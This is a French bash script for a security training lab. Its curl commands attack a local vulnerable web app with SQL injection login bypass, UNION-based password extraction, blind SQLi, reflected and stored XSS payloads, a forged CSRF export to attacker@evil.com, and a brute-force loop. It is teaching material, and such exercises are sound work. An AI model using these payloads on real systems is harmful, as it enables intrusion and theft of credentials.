#!/usr/bin/env bash
# ============================================================================
# TP Réel Chapitre 2 - Commandes curl manuelles
# Copiez-collez ligne par ligne dans votre terminal (n'exécutez pas
# le fichier entier d'un coup si vous voulez tester à votre rythme).
# ============================================================================

TARGET="http://localhost:5000"

# ----------------------------------------------------------------------
# RECONNAISSANCE
# ----------------------------------------------------------------------

# Vérifier que la cible répond
curl -i "$TARGET/"

# Voir la page de login
curl -s "$TARGET/login"

# ----------------------------------------------------------------------
# VULN 1 - Authentication bypass (SQLi dans /login)
# ----------------------------------------------------------------------

curl -i -X POST "$TARGET/login" \
    --data-urlencode "username=admin' OR '1'='1--" \
    --data-urlencode "password=anything"

# Variante avec LIMIT
curl -i -X POST "$TARGET/login" \
    --data-urlencode "username=' OR 1=1 LIMIT 1--" \
    --data-urlencode "password=anything"

# ----------------------------------------------------------------------
# VULN 2 - SQL Injection dans /search
# ----------------------------------------------------------------------

# Retourner tous les enregistrements
curl -s -G "$TARGET/search" --data-urlencode "q=' OR '1'='1"

# UNION SELECT : extraire les utilisateurs et mots de passe via /search
curl -s -G "$TARGET/search" \
    --data-urlencode "q=' UNION SELECT 1, username, password, email FROM users--"

# Time-based blind SQLi (mesurer le temps de réponse)
time curl -s -G "$TARGET/search" --data-urlencode "q=' AND SLEEP(5)--"

# Provoquer une erreur SQL pour voir le message (information disclosure)
curl -s -G "$TARGET/search" --data-urlencode "q=' AND 1=CONVERT(int, 'x')--"

# ----------------------------------------------------------------------
# VULN 3 - Reflected XSS dans /search
# ----------------------------------------------------------------------

curl -s -G "$TARGET/search" --data-urlencode "q=<script>alert('XSS')</script>"
curl -s -G "$TARGET/search" --data-urlencode "q=<img src=x onerror=alert('XSS')>"
curl -s -G "$TARGET/search" --data-urlencode "q=<svg/onload=alert('XSS')>"

# ----------------------------------------------------------------------
# VULN 4 - Stored XSS dans /api/comments
# ----------------------------------------------------------------------

# Poster un commentaire piégé
curl -i -X POST "$TARGET/api/comments" \
    --data-urlencode "name=attacker" \
    --data-urlencode "comment=<img src=x onerror=\"console.log('XSS')\">"

# Récupérer les commentaires en JSON (payload non échappé)
curl -s "$TARGET/api/comments"

# Voir la page HTML rendue (le payload s'exécute dans le navigateur)
curl -s "$TARGET/comments"

# ----------------------------------------------------------------------
# VULN 5 - CSRF sur /export
# ----------------------------------------------------------------------

# Requête forgée sans token CSRF, comme le ferait un site tiers malveillant
curl -i -X POST "$TARGET/export" \
    --data-urlencode "format=csv" \
    --data-urlencode "email=attacker@evil.com"

# ----------------------------------------------------------------------
# VULN 6 - Politique de mot de passe faible
# ----------------------------------------------------------------------

curl -i -X POST "$TARGET/register" \
    --data-urlencode "username=weakuser1" \
    --data-urlencode "password=123" \
    --data-urlencode "email=weakuser1@test.com"

curl -i -X POST "$TARGET/register" \
    --data-urlencode "username=weakuser2" \
    --data-urlencode "password=password" \
    --data-urlencode "email=weakuser2@test.com"

# ----------------------------------------------------------------------
# VULN 7 - Absence de rate limiting (brute force)
# ----------------------------------------------------------------------

for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "$TARGET/login" \
      --data-urlencode "username=admin" \
      --data-urlencode "password=attempt$i"
done
echo ""

# ----------------------------------------------------------------------
# BONUS - Information disclosure (/api/users)
# ----------------------------------------------------------------------

curl -s "$TARGET/api/users" | python3 -m json.tool
